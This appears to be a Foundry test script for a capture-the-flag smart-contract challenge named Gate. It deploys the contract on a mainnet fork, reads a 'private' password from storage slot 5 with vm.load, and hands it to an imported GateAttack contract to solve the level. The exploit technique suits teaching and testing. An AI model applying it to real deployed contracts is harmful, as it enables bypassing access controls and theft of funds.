// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "./GateAttack.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    Gate gate;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);
        deal(deployer, 1 ether);

        gate = new Gate(keccak256(abi.encode(1)), keccak256(abi.encode(2)), keccak256(abi.encode(3)));

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", gate.isSolved());
        vm.stopPrank();
    }

    function solve() public {
        bytes32 password = vm.load(address(gate), bytes32(abi.encode(5)));
        GateAttack gateAttack = new GateAttack();
        gateAttack.attack(address(gate), abi.encode(password));
    }
}


